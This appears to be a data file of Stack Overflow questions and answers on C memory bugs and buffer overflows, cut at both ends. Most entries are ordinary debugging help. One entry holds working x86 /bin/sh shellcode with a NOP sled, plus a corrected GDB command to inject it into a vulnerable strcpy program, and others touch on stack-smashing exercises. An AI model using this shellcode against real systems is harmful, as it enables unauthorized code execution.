jmp esp followed by 26 nops (or whatever padding since it's not going to be executed) instead.\n",
        "Source": "https://stackoverflow.com/questions/77832621/rop-the-use-of-the-jmp-esp"
    },
    {
        "Title": "why is my malloc(1) segfaulting my program?",
        "Question": "I have a problem in my C program that makes it so that it segfaults on malloc(1). I've spent many hours trying to find out why it segfaults but\nI just can't figure it out. This portion of my program separates strings using identifiers. Example, string=\"12wo4ne53wone86wo99w5ne\"; identifiers, start=\"wo\", end=\"ne\"; would return {\"wo4ne\", \"wone\", \"wo99w5ne\"}.\nMy code is as follows.\n// basically like substring() in java\nchar* stringAt(char* str, int start, int end) {\n    int length = end - start + 1;\n    int temp = start;\n    char* savedChar = NULL;\n    savedChar = malloc(length + 1);\n    for(int x = 0; x < length; x++) {\n        savedChar[x] = str[temp];\n        temp++;\n    }\n    savedChar[length] = '\\0';\n    return savedChar;\n}\n\n// finds \"identifier\" in string after certain position in that string\nint findIdentifier(char* str, char* identifier, int pos, int isEnd) {\n\n    // checks first character with first character in \"identifier\"\n    for(int x = pos; x < strlen(str) - 1; x++) {\n        if(str[x] == identifier[0]) {\n\n            // if first characters match then check rest\n            for(int i = 0; i < strlen(identifier); i++) {\n                if(str[x + i] != identifier[i]) {\n                    i = strlen(identifier);\n                }\n                if(i == strlen(identifier) - 1) {\n\n                    // isEnd checks if you should count the last position of the identifier...\n                    // -like ident=\"1234\" then \"end\" is the position of \"4\".\n                    // -not end be the position of \"1\"\n                    if(isEnd == 1) {\n                        return x + strlen(identifier) - 1;\n                    }\n                    return x;\n                }\n            }\n        }\n    }\n    return -1;\n}\n\nchar** separateStrings(char* str, char* identifier, char* lastIdentifier) {\n    char** savedStr = NULL;\n\n    // segfault here!\n    savedStr = malloc(1);\n    // segfualt here!\n\n    int start = -2;\n    int end = 0;\n    int x = 0;\n    do {\n\n    // first run check/gets first and last positions of the identifier in the string\n    if(start == -2) {\n        start = findIdentifier(str, identifier, 0, 0);\n    } else {\n    start = findIdentifier(str, identifier, end + 1, 0);\n    }\n    end = findIdentifier(str, lastIdentifier, start + 1, 1);\n    \n    if(start != -1) {\n        if(end == -1) {\n            end = strlen(str);\n        }\n        char* newStr = stringAt(str, start, end);\n\n        // dynamically increase the size of savedStr (x is iterated every run through here)\n        realloc(savedStr, x + 1);\n        savedStr[x] = malloc(strlen(newStr) + 1);\n        strcpy(savedStr[x], newStr);\n        x++;\n    }\n\n    } while(start != -1 && end != -1);\n    return savedStr;\n}\n\nI have tried looking up why this could not be working and the only thing I can think of is a Buffer Overflow. So I then tried to run findIdentifier() many times but that works fine.\nThe program is also inconsistent and sometimes runs farther into the code than others but is accurate with its outcomes.\n",
        "Answer": "If savedStr is supposed to be a dynamically allocated array of strings, then allocating 1 byte of memory is not sufficient to store a pointer to a char (depending on your platform, this requires either 4 or 8 bytes).\nEven when you realloc it to be larger, you're only adding 1 byte at a time. This when you reference and assign with savedStr[x] = malloc(strlen(newStr) + 1); you're invoking undefined behavior, which in this case it would seem has manifested as a segmentation fault.\nYou almost certainly want to allocate:\nsavedStr = malloc(sizeof(char *));\n\nAnd then when you re-allocate:\nrealloc(savedStr, (x + 1) * sizeof(char *));\n\nBut you also want to capture the pointer realloc returns. If you're not too worried about allocation error checking:\nsavedStr = realloc(savedStr, (x + 1) * sizeof(char *));\n\nBreaking out the dynamically resized string vector problem\nOne of the core problems your code solves is having an array that grows dynamically. If you break this bit of code out, then you can approach the remainder of your program without worrying about the memory management.\nThe size of the array doubles when needed rather than growing by a single entry to minimize allocations. There may be more ideal growth factors for efficiency.\n#include <string.h>\n#include <stdlib.h>\n#include <stdio.h>\n\nstruct string_vec {\n    char **data;\n    size_t cap;\n    size_t sz;\n};\n\nstruct string_vec *string_vec_new(size_t cap) {\n    struct string_vec *vec = malloc(sizeof(struct string_vec));\n    if (!vec) return NULL;\n\n    *vec = (struct string_vec){\n        .data = malloc(sizeof(char *) * cap),\n        .cap = cap,\n        .sz = 0\n    };\n\n    return vec;\n}\n\nstruct string_vec *string_vec_add(\n    struct string_vec *vec,\n    const char *str\n) {\n    if (vec->sz < vec->cap) {\n        vec->data[vec->sz++] = strdup(str);\n        return vec;\n    }\n\n    char **new_data = realloc(vec->data, sizeof(char *) * vec->cap * 2);\n    if (!new_data) return NULL;\n\n    vec->data = new_data;\n    vec->cap *= 2;\n    vec->data[vec->sz++] = strdup(str);\n\n    return vec;\n}\n\nvoid string_vec_del(struct string_vec *vec) {\n    for (size_t i = 0; i < vec->sz; i++) {\n        free(vec->data[i]);\n    }\n\n    free(vec->data);\n}\n\n",
        "Source": "https://stackoverflow.com/questions/77724594/why-is-my-malloc1-segfaulting-my-program"
    },
    {
        "Title": "How to properly memcpy without overflow issues",
        "Question": "In a legacy code I am getting buffer overflow errors in fortify audit.\nLet me explain the issue here:\nI have a function, say foo(size_t len, unsigned char **buf)  ,in this foo I am memcopying a string variable in buf as follows.\nchar temp[256];\n\nsprintf(temp, \"abcd%s\",somefunct_string.c_str()); //so the string temp is variable length\n\nmemcpy(*buf, temp, temp.length()); \n\nin practical, the temp.length() is always < len (which is buf alloted size). But fortify would give potential risk here.\nhow do i resolve this?\n",
        "Answer": "Try calling the std::string::data() function to access the string via a pointer to the string.\nmemcpy(*buf, somefunct_string.data(), somefunct_string.size());\n\nAlso, memcpy_s() is available since C11.\nmemcpy_s(*buf, temp.length(), somefunct_string.data(), somefunct_string.size())\n\nmemcpy() and memcpy_s() are called when copying a sequence from one array to another array.  If the copy overlaps within the same array, memmove() or memmove_s() should be called.\n",
        "Source": "https://stackoverflow.com/questions/77593393/how-to-properly-memcpy-without-overflow-issues"
    },
    {
        "Title": "Why getting &quot;segmentation fault&quot; when sending 127 characters to a buffer with capacity of 128",
        "Question": "I have the following code taken from a binary exploitation exercises:\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n\n#define BANNER \\\n  \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"\n\nchar *gets(char *);\n\nvoid start_level() {\n  char buffer[128];\n  gets(buffer);\n}\n\nint main(int argc, char **argv) {\n  printf(\"%s\\n\", BANNER);\n  start_level();\n}\n\nMy question is regarding the way the buffer stores the information.\nOur buffer has storage for 128 characters.\nWhen I send 127 characters I am getting segmentation fault:\nuser@phoenix-amd64:/opt/phoenix/amd64$ python -c 'print(\"A\"*127)'  | ./stack-five \nWelcome to phoenix/stack-five, brought to you by https://exploit.education\nSegmentation fault\n\n\nBut if I send 126 characters, there is not error:\nuser@phoenix-amd64:/opt/phoenix/amd64$ python -c 'print(\"A\"*126)'  | ./stack-five \nWelcome to phoenix/stack-five, brought to you by https://exploit.education\nuser@phoenix-amd64:\n\nIf the buffer has capacity of 128, and I sent it 127 characters, why it failed? It should have at least one more place no?\nOne thing I though is maybe after sending 127 characters, it adds the NULL terminator (\\x00) but even if that happens, we have exactly 128 characters, so why it crash?\n",
        "Answer": "You have a buffer overflow between the '\\n' that Python print() adds and the '\\0' you need for the string that c adds:\n[python3 -c 'print(\"A\"*126)' | wc -c\n127\n\nI would fix that in Python with:\npython3 -c \"print('A'*126, end='')\" | wc -c\n126\n\ngets() is unsafe so use fgets() instead.\n",
        "Source": "https://stackoverflow.com/questions/77504824/why-getting-segmentation-fault-when-sending-127-characters-to-a-buffer-with-ca"
    },
    {
        "Title": "C problem about Compiler and Memory Theory",
        "Question": "Without calling any \"call\" or \"jump\" function, we need to get a output in order of \"this is the first\" then \"this is the second.\". In my opinion we need to use \"bold\" with the use of Memory and instructions. Also we cannot call the function of \"study\".\n#include <stdio.h>\n\nvoid study()\n{\n    printf(\"this is the second.\\n\");\n}\n\nvoid study2()\n{\n    int bold[4];\n    // can only modify this section BEGIN\n    // cant call study(), maybe use study(pointer to function)\n\n\n    // can only modify this section END\n    printf(\"this is the first\\n\");\n}\n\nint main(int argc, char *argv[])\n{\n    study2();\n    return 0;\n}\n\n",
        "Answer": "Perhaps not what OP had in mind, yet macros do the trick.\n#include <stdio.h>\n\nvoid study() {\n  printf(\"this is the second.\\n\");\n}\n\nvoid study2() {\n  int bold[4];\n  // can only modify this section BEGIN\n  // Without calling any \"call\" or \"jump\" function, \n  #define F1 study\n  #define F2 study2\n  #define study2() F2(); F1();\n  // can only modify this section END\n  printf(\"this is the first\\n\");\n}\n\nint main(int argc, char *argv[]) {\n  study2();\n  return 0;\n}\n\nOutput\nthis is the first\nthis is the second.\n\n\nMaybe violates <Also we cannot call the function of \"study\".>.  Depends on \"we\", if \"we\" is the portion of code between BEGIN ... END, it is OK.\nElse if \"we\" is anywhere in code, than maybe a direct approach:\nvoid study2() {\n  int bold[4];\n  // can only modify this section BEGIN\n  #define printf(x) printf(\"this is the first\\nthis is the second.\\n\")\n  // can only modify this section END\n  printf(\"this is the first\\n\");\n}\n\n\n@Peter Cordes suggests a 3rd way, where our modification does not call study().\nvoid study2() {\n  int bold[4];\n  // can only modify this section BEGIN\n  atexit(study);\n  // can only modify this section END\n  printf(\"this is the first\\n\");\n}\n\n",
        "Source": "https://stackoverflow.com/questions/77399108/c-problem-about-compiler-and-memory-theory"
    },
    {
        "Title": "&#39;malloc(): corrupted top size&#39; After allocating more than 200K int",
        "Question": "I got assignment to do Bucket Sort with openMP, and I decided to do Quick Sort on each bucket. The requirement wants me to test by keep increasing the amount of integers and change the number of thread until reaching 1 million integers with 16 threads.\nHere's my code in C:\n#include <stdio.h>\n#include <omp.h>\n#include <time.h>\n#include <stdlib.h>\n#include <math.h>\n\nvoid swap(int* a, int* b) {\n    int temp = *a;\n    *a = *b;\n    *b = temp;\n\n}\n\nint partition(int arr[], int low, int high) {\n\n    int pivot = arr[high];\n    int i = low - 1;\n\n    for (int j = low; j < high; j++) {\n\n        if (arr[j] <= pivot) {\n            i++;\n            swap(&arr[i], &arr[j]);\n        }\n\n    }\n\n    swap(&arr[i + 1], &arr[high]);\n\n    return (i + 1);\n}\n\nvoid quickSort(int arr[], int low, int high) {\n\n    if (low < high) {\n        int pi = partition(arr, low, high);\n\n        quickSort(arr, low, pi - 1);\n        quickSort(arr, pi + 1, high);\n    }\n\n}\n\nint main(int argc, char* argv[]) {\n\n    //Check arguments\n    if (argc > 3 || argc < 3) {\n        fprintf(stderr, \"Error: Invalid arguments. This program require 2 arguments.\\nUsage: ./bucketSort <thread number> <amount of random number>\\n\");\n        return 1;\n    }\n\n    printf(\"Random seed\");\n\n    //Initialize random seed\n    srand((unsigned)time(NULL));\n\n    int threadNum = atoi(argv[1]);\n    int randomTime = atoi(argv[2]);\n\n    int* numArr = (int*)malloc(randomTime * sizeof(int));\n\n    if(numArr == NULL){\n        fprintf(stderr, \"Error: Unable to allocate memory.\");\n        return 1;\n    }\n\n    printf(\"\\nStart random\");\n\n    //Since RAND_MAX is limited to 0x7FFF (32,767), so we need to get creative to random beyond RAND_MAX\n    for (int i = 0; i < randomTime; i++) {\n\n        int rand1 = rand();\n        int rand2 = rand();\n        int rand3 = rand();\n\n        int combinedRandom = ((rand1 % 100) * 1000) + ((rand2 % 100) * 10) + (rand3 % 10);\n\n        numArr[i] = combinedRandom;\n\n    }\n\n    printf(\"\\nFinished Random\");\n\n    double timeSpent = 0;\n\n    int rangePerBucket = ceil(99999 / threadNum);\n\n    int* outputArr = (int*)malloc(randomTime * sizeof(int));\n\n    int* groupMemberCount = (int*)malloc(threadNum * sizeof(int));\n\n    if(outputArr == NULL || groupMemberCount == NULL){\n        fprintf(stderr, \"Error: Unable to allocate memory.\");\n        return 1;\n    }\n\n    clock_t begin = clock();\n\n    printf(\"\\nStart parallel section.\");\n\n    #pragma omp parallel shared(numArr, outputArr, groupMemberCount) num_threads(threadNum)\n    {\n\n        int myID = omp_get_thread_num();\n        int totalThread = omp_get_num_threads();\n\n        int beginRange = myID * rangePerBucket;\n        int endRange = (myID + 1) * rangePerBucket - 1;\n\n        int* temp = (int*)omp_alloc(rangePerBucket * sizeof(int), omp_large_cap_mem_alloc);\n\n        if( temp == NULL ){\n            fprintf(stderr, \"Error: Thread %d is unable to allocate memory.\", myID);\n\n        }\n\n        int memberCount = 0;\n\n        //Put in bucket\n        for (int j = 0; j < randomTime; j++)\n        {\n            if (numArr[j] >= beginRange && numArr[j] <= endRange) {\n                temp[memberCount] = numArr[j];\n                memberCount++;\n            }\n        }\n\n        groupMemberCount[myID] = memberCount;\n\n        int* myGroup = (int*)omp_alloc(memberCount * sizeof(int), omp_large_cap_mem_alloc);\n\n        if( myGroup == NULL ){\n            fprintf(stderr, \"Error: Thread %d is unable to allocate memory.\", myID);\n        }\n\n        for (int i = 0; i < memberCount; i++) {\n            myGroup[i] = temp[i];\n        }\n\n        //Sort\n        quickSort(myGroup, 0, memberCount - 1);\n        printf(\"\\nThread %d of %d has finished sorting.\", myID, totalThread);\n\n        //Find the start of output array\n        int startIndex = 0;\n        for( int i = 0; i < myID; i++ ){\n            startIndex += groupMemberCount[i];\n        }\n\n        //Combine array\n        for (int k = 0; k < memberCount; k++) {\n\n            outputArr[startIndex + k] = myGroup[k];\n\n        }\n\n        printf(\"\\nArray from thread %d has combined.\", myID);\n\n        omp_free(myGroup, omp_large_cap_mem_alloc);\n        omp_free(temp, omp_large_cap_mem_alloc);\n    }\n\n    free(numArr);\n    free(outputArr);\n    free(groupMemberCount);\n\n    clock_t end = clock();\n\n    timeSpent = (double)(end - begin) / CLOCKS_PER_SEC;\n\n    printf(\"\\nTime spent sorting: %f seconds.\\n\", timeSpent);\n\n    return 0;\n}\n\nI compiled it with gcc -fopenmp ./bucketSort.c -o ./bucketSort. Everything runs fine until I start testing with 100K integers (I wrote 200K in the topic because my program allocate it twice). The program immediately return malloc(): corrupted top size after printing Finished Random (so the first 100K in numArr is fine?). This is the first time I used malloc() and omp_alloc(), so feel free to correct me if I've done something wrong. I'm running this code in Ubuntu WSL btw.\nWhat I've tried:\n\nI tried calloc() but the result is the same, error after 2nd calloc().\nI tried increase ulimit to unlimit.\n\n",
        "Answer": "Usually, valgrind or -fsanitize=address give good diagnostics for such errors.\nCompiling and linking with -fsanitize=address shows that there is a heap overflow on this line:\n                temp[memberCount] = numArr[j];\n\nThe memberCount variable is equal to rangePerBucket at this point.  Both are one less than randomTime.  But the temp array has only rangePerBucket elements, so that index is out of range.\n",
        "Source": "https://stackoverflow.com/questions/77303320/malloc-corrupted-top-size-after-allocating-more-than-200k-int"
    },
    {
        "Title": "How to represent ASCII code 16 as a character?",
        "Question": "[C language] [Linux]\n\"ASCII code 16 is represented by the control character \u2410 also known as the data link escape\"\nI want to take this character from the keyboard as an input to a program that allows you to do a buffer overflow. It works only if i overwrite an INT variable with this value: 1161258512.\nI don't know how to build this number because it s not possible to write the single character 16 as an input. I also tried with the escape sequence but it didn't work. Maybe i should use unicode to do that and write the first 2 characters (with the 16 included) of the 4 byte payload.\nI'm new to this kind of things so please if you know more i would really appreciate it\n",
        "Answer": "\nit s not possible to write the single character 16 as an input\n\nThis is a strange expression. DLE is 0x10, 16, as you know.\nHow to get this from the keyboard depends much of many things you did not disclose: what OS?\nThe control key on input\nThe effect of pressing control as you type a key is to mask bits 5 and 6, those with values 32 and 64, so this is your answer:\nyou can use Ctrl+P, Ctrl+p or Ctrl+0 since there 3 possible values:\n\n0 is 0x30\nP is 0x50\nP is 0x70\n\nBut to read this you need to prepare your keyboard driver.  Under Linux and family pos-Unix use raw input and under Windows call ReadConsoleInput or similar.\nIn short you save the input configuration, prepare it to some that suits your needs, such disabling echo and buffering, then read the key codes. And at the end you restore everything.\nMicrosoft have a Console Reference. Under Linux man is your friend. Look for raw io and ioctl\n",
        "Source": "https://stackoverflow.com/questions/77077702/how-to-represent-ascii-code-16-as-a-character"
    },
    {
        "Title": "Changing values in hex-editor properly",
        "Question": "I want to change a file (.ULNC) and successfully did so in the past when the decoded texts i change have the same length or when the value I want to replace is bigger then the one i want to replace it with by filling the blanks with 00\nNow I have the issue, that the opposite is the case and my \"new\" encoded text is a bigger length than the original one.\nTo be more clear:\nI want to replace 53 61 6D 48 51 5F 41 with 53 61 6D 44 69 76 69 6E 67 5F 41\nwhat I want to change\nAny help or hint would be greatly appreciated!\nI tried just copying the value in like you see in the screenshot.\nmy attempt\nHxD Hex Editor warns me, it will change the filesize. When I confirm, start the program and load the changed file, it causes a bufferoverflow and crashes.\nI also tried... deleting some 00 00 00 00 in a place I thought they were not needed, the program then also crashed, this time without bufferoverflow warning.\n",
        "Answer": "I did it by shortening 53 61 6D 44 69 76 69 6E 67 5F 41 in the file it got originally referenced to 53 61 6D 44 69 76 69 and so kept the same byte size as  53 61 6D 48 51 5F 41.\nWorks now.\n",
        "Source": "https://stackoverflow.com/questions/76983981/changing-values-in-hex-editor-properly"
    },
    {
        "Title": "Overflow when reading a file",
        "Question": "When reading a simple file, I keep overflowing and reading bytes out of the file despite making sure I get the size of the file in bytes prior to the read.\nHere is my current code:\nFILE* file;\nint error_no = fopen_s(&file, filepath, \"r\");\n\nif (error_no != 0 || file == 0) {\n    std::cout << \"Error whilst reading file: \" + error_no;\n}\n\nfseek(file, 0, SEEK_END);\nsize_t size = ftell(file);\n\nchar* fileAsString = (char*) malloc(size+1);\n\nfseek(file, 0, SEEK_SET);\nfread(fileAsString, 1, size, file);\n\nfileAsString[size] = 0;\n\nstd::cout << \"\\n\" << size << \"\\n\";\nstd::cout << fileAsString;\n\nfclose(file);\n\nI am expecting to open the file, push the stream to the end of the file and use ftell to find the number of characters in the file.\nThen I make a string buffer to copy the file's content into.\nThen finally I reset the file stream and read it into my string buffer. I complete this by adding the end-of-string character at the end of the buffer.\nSadly this is what I get:\n114\n#version 330 core\n\nlayout(location = 0) out vec4 color;\n\nvoid main()\n{\n        color = vec4(1.0, 0.0, 0.0, 1.0);\n}\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\nI checked and the file contains 107 characters, which explains the 114 length and 7 '=' characters that shouldn't be there.\nThe actual file contents are:\n#version 330 core\n\nlayout(location = 0) out vec4 color;\n\nvoid main()\n{\n    color = vec4(1.0, 0.0, 0.0, 1.0);\n}\n\nHope this is clear enough!\n",
        "Answer": "When you read a file with \"r\" mode, you are reading in text mode and your two-byte \\r\\n line endings are being converted to \\n strings in memory.  But ftell is returning the length of the file in bytes (with each newline counting for two bytes).  But you are marking the end of the string (by setting a null character) according to how  many bytes were in the file, as opposed to how many characters are in the string.  Since you have placed your null terminator past the end of the string, you have one character of junk for each newline in your original file.\nInstead, you probably want to preserve the bytes of the original file. To do this, try opening the file in \"rb\" mode to read it in binary mode which should prevent it from changing \\r\\n in the file to \\n in the string in memory.\n",
        "Source": "https://stackoverflow.com/questions/76958048/overflow-when-reading-a-file"
    },
    {
        "Title": "Index overflow in for loop with nested thread",
        "Question": "I am writing a testing utility (a WinForm) to check how a web site perform. To do so i set a number of request to make, with a list of parameters associated with requests. I can set the requests to happen in parallel or in sequence.\nIf i work in sequence everything is fine, but if i work in parallel i get a strange issue with the for loop.\nI know i may use Parallel.For but because i am investigating another bug related to parallelism i temporary used a regualr for, with a nested action executed directly or with a Task.Run().\nHere the problematic code :\nprivate void Run()\n{\n    ConcurrentBag<long> callTimes = new ConcurrentBag<long>();\n    int httpErrors = 0;\n    int progress = 0;\n\n    string uri = txtUrl.Text ?? string.Empty;\n    if (string.IsNullOrWhiteSpace(uri))\n        return;\n\n    Func<List<string>,int,long> testCall = (p,i) =>\n    {\n        try\n        {\n            using (var client = new HttpClient())\n            {\n                Stopwatch timer = new Stopwatch();\n                timer.Start();\n\n                string actualUrl = string.Format(uri, p.ToArray());\n                var getTask = client.GetAsync(actualUrl);\n                getTask.Wait();\n\n                timer.Stop();\n\n                var result = getTask.Result;\n                if (result == null || (int)result.StatusCode >= 400)\n                {\n                    txtErrors.ThreadSafeAppendText($\"Connection error {(result?.StatusCode.ToString() ?? \"NULL\")}'\\r\\n\");\n                    Interlocked.Increment(ref httpErrors);\n                }\n\n                return timer.ElapsedMilliseconds;\n            }\n        }\n        catch ( Exception actionErr)\n        {\n            txtErrors.ThreadSafeAppendText($\"Error while execution callAction {i} with parameters '{string.Join(\", \" , p)}' : \\r\\n\" + actionErr.Message);\n        }\n\n        return -1;\n    };\n\n    try\n    {\n        List<List<string>> parameters = this.ParseParameters();\n        int parametersCount = parameters.Count;\n        int executions = (int)updRequests.Value;\n\n        //used to randomly access parameters in a way suitable also for the parallel scenario (i precompute all the random number i need while parallel processing is not yet started)\n        Random rng = new Random();\n        List<int> randoms = new List<int>();\n        for (int i = 0; i < executions; i++)\n            randoms.Add(rng.Next(0, parametersCount));\n\n        //randoms.Count is guaranteed to be equal to executions \n\n\n        for ( int index = 0; index < executions; index++)\n        {\n            Action parallelAction = () =>\n            {\n                int currentIndex = index;\n                List<string> currentParameter = parameters[randoms[currentIndex] % parametersCount]; //<<--- strange overflow here currentIndex >= executions\n                callTimes.Add(testCall(currentParameter, currentIndex));\n\n                Interlocked.Increment(ref progress);\n\n                if (progress % 10 == 0)\n                    prbProgress.ThreadSafeAction(this.RefreshProgressBar, progress, executions);\n            };\n\n            if (chkParallelExecution.Checked)\n                Task.Run(parallelAction);\n            else\n                parallelAction();\n        }\n\n\n        this.Reporting(callTimes, httpErrors);\n    }\n    catch (Exception err)\n    {\n        txtErrors.ThreadSafeAppendText($\"Error while running stress test : \\r\\n\" + err.Message);\n    }\n}\n\nThe strange thing i don't understand is how the variable called currentIndex become >= executions variable, because only the loop manipulate those two variable and should enforce the opposite.\nSo i think i am missing something in my understanding on how parallel processing happen here.\n",
        "Answer": "There is a fairly well known issue with capturing loop variables.\nSo you should probably write\nfor ( int index = 0; index < executions; index++)\n{\n    int currentIndex = index;\n    Action parallelAction = () =>\n    {\n        ...\n\nAnother possible issue:\nparameters[randoms[currentIndex] % parametersCount];\n\nFor all you know the values in randoms could all be zero. Are you sure you don't want to create an array of 0..executions, and shuffle this instead?\nI can't see any obvious reasons why this example should fail however. But errors with indices etc should be rather obvious if you do some debugging.\n",
        "Source": "https://stackoverflow.com/questions/76874536/index-overflow-in-for-loop-with-nested-thread"
    },
    {
        "Title": "Not getting the expected output when running a shell code in a buffer overflow",
        "Question": "After finding the eip offset i'm trying to input some shell code to my program. With the following command run $(python -c 'print(\"A\"*108 + \"BBBB\")') i get the following output\nProgram received signal SIGSEGV, Segmentation fault.\n0x42424242 in ?? ()\n\nNow the problem occurs when i try to add my shell code. When i input\nrun $(python -c 'print(\"\\x90\"*63 + \"\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\" + \"B\" * 20)')\n\ni don't get what i was exepected, the return address being overwritten with B's, but i get the following\nProgram received signal SIGSEGV, Segmentation fault.\n0x90c290c2 in ?? ()\n\nIt does work, when i increase the number of B's to 48 and decrease the number of NOPs to 35, but i'm not quite understanding why this doesn't work with more NOPs and less B's for the return address. One other thing i do not understand is that i'm not seeing any NOPs in my stack.\n(gdb) x/200x $esp\n0xffffd2a0: 0x42424242  0x42424242  0x42424242  0x42424242\n0xffffd2b0: 0x42424242  0x42424242  0x42424242  0x42424242\n0xffffd2c0: 0x42424242  0x42424242  0x00424242  0x00000001\n0xffffd2d0: 0xffffd398  0x68e47ce5  0x9e780f0a  0x00000000\n0xffffd2e0: 0x00000000  0x00000000  0xffffd3e0  0x0804b519\n0xffffd2f0: 0x00000000  0x08049c76  0xffffd3e0  0x0804b52d\n0xffffd300: 0x00000000  0x00000000  0x00000000  0x0804968d\n0xffffd310: 0x00000040  0x0000000c  0x00000040  0x00000008\n0xffffd320: 0x00040000  0x00000040  0x00002000  0x00300000\n0xffffd330: 0x00090000  0x00040000  0x00002000  0x00008000\n0xffffd340: 0xffffd370  0xffffd3d4  0x00000002  0x00000001\n0xffffd350: 0x00000006  0x00000045  0x00000001  0x00300000\n0xffffd360: 0x000c0000  0x00000004  0x00000001  0x00000000\n0xffffd370: 0xffffffff  0x00000000  0x080e3620  0x00000000\n0xffffd380: 0x00000000  0x00000000  0xffffd3b0  0x080e3ff4\n0xffffd390: 0x00000002  0x00000000  0x00000000  0x08049688\n0xffffd3a0: 0x00000000  0x00000000  0x00000000  0x08049688\n0xffffd3b0: 0x0804968d  0x00000002  0xffffd3d4  0x00000000\n0xffffd3c0: 0x00000000  0x00000000  0xffffd3cc  0x00000000\n0xffffd3d0: 0x00000002  0xffffd5d2  0xffffd609  0x00000000\n0xffffd3e0: 0xffffd6a5  0xffffd6b5  0xffffd6c9  0xffffd6ff\n0xffffd3f0: 0xffffd70c  0xffffd746  0xffffd773  0xffffd78a\n0xffffd400: 0xffffd79e  0xffffd7d1  0xffffd80f  0xffffd826\n0xffffd410: 0xffffd83e  0xffffd881  0xffffd891  0xffffd89d\n0xffffd420: 0xffffd8bd  0xffffd8cc  0xffffd8ff  0xffffd90a\n0xffffd430: 0xffffd925  0xffffd93a  0xffffd94f  0xffffd95e\n0xffffd440: 0xffffd97e  0xffffd9ac  0xffffd9bb  0xffffd9c4\n0xffffd450: 0xffffda14  0xffffda22  0xffffda33  0xffffda48\n0xffffd460: 0xffffda60  0xffffda6c  0xffffdaf0  0xffffdb01\n0xffffd470: 0xffffdb35  0xffffdb64  0xffffdbb0  0xffffdbbf\n0xffffd480: 0xffffdbd4  0xffffdbeb  0xffffdc09  0xffffdc1d\n0xffffd490: 0xffffdc25  0xffffdc3b  0xffffdc6d  0xffffdc78\n0xffffd4a0: 0xffffdc80  0xffffdc99  0xffffdcb4  0xffffdcbf\n0xffffd4b0: 0xffffdcd0  0xffffdcef  0xffffdd21  0xffffdd35\n0xffffd4c0: 0xffffdd53  0xffffdd6a  0xffffdd83  0xffffdda1\n0xffffd4d0: 0xffffde16  0xffffde2c  0xffffde3c  0xffffdf08\n0xffffd4e0: 0xffffdf1a  0xffffdf50  0xffffdf6c  0xffffdf84\n0xffffd4f0: 0xffffdf9b  0x00000000  0x00000020  0xf7ffc570\n0xffffd500: 0x00000021  0xf7ffc000  0x00000033  0x000006f0\n0xffffd510: 0x00000010  0xbfebfbff  0x00000006  0x00001000\n0xffffd520: 0x00000011  0x00000064  0x00000003  0x08048034\n0xffffd530: 0x00000004  0x00000020  0x00000005  0x00000009\n0xffffd540: 0x00000007  0x00000000  0x00000008  0x00000000\n0xffffd550: 0x00000009  0x08049660  0x0000000b  0x000003e8\n0xffffd560: 0x0000000c  0x000003e8  0x0000000d  0x000003e8\n0xffffd570: 0x0000000e  0x000003e8  0x00000017  0x00000000\n0xffffd580: 0x00000019  0xffffd5bb  0x0000001a  0x00000002\n0xffffd590: 0x0000001f  0xffffdfc1  0x0000000f  0xffffd5cb\n0xffffd5a0: 0x0000001b  0x0000001c  0x0000001c  0x00000020\n0xffffd5b0: 0x00000000  0x00000000  0x62000000  0x9e72e32a\n\n\nI'm using Python 3. The shell code is 25 bytes long. I have already disabled ASLR.\nThis is my code in C\n#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char** argv){\n    char buffer[100];\n    strcpy(buffer, argv[1]);\n\n    return 0;\n}\n\n",
        "Answer": "Python3's string literals \"...\" default to UTF-8 (Unicode) encoding when printing, not 8-bit ASCII (ISO-8859-1/Latin-1). As a result extra characters are being output that renders your shellcode unusable.\nIf you were to run your Python command like:\npython -c 'print(\"\\x90\"*63 + \"\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\" + \"B\" * 20)' | hexdump -C\n\nPiping the output through hexdump can make the issue more obvious. The output will look something like:\n00000000  c2 90 c2 90 c2 90 c2 90  c2 90 c2 90 c2 90 c2 90  |................|\n*\n00000070  c2 90 c2 90 c2 90 c2 90  c2 90 c2 90 c2 90 c3 ab  |................|\n00000080  0b 5b 31 c3 80 31 c3 89  31 c3 92 c2 b0 0b c3 8d  |.[1..1..1.......|\n00000090  c2 80 c3 a8 c3 b0 c3 bf  c3 bf c3 bf 2f 62 69 6e  |............/bin|\n000000a0  2f 73 68 42 42 42 42 42  42 42 42 42 42 42 42 42  |/shBBBBBBBBBBBBB|\n000000b0  42 42 42 42 42 42 42 0a                           |BBBBBBB.|\n000000b8\n\nYou'll notice that the value C2 and C3 have been inserted into the middle of your code for those characters that are >= 0x80. As a result the output is no longer suitable as shellcode.\nIf you switch to using Python2 the problem would resolve itself since it doesn't default to a Unicode character set. Something that works for Python2 and Python3 is the use of byte string literals b'...' and use sys.stdout.buffer.write to output the bytes to standard output.\nA command like this should work in GDB:\nrun $(python -c \"import sys; sys.stdout.buffer.write(b'\\x90'*63 + b'\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68' + b'B' * 20)\")\n\n",
        "Source": "https://stackoverflow.com/questions/78100496/not-getting-the-expected-output-when-running-a-shell-code-in-a-buffer-overflow"
    },
    {
        "Title": "EIP doesn&#39;t get overwritten when perfoming a buffer overflow attack",
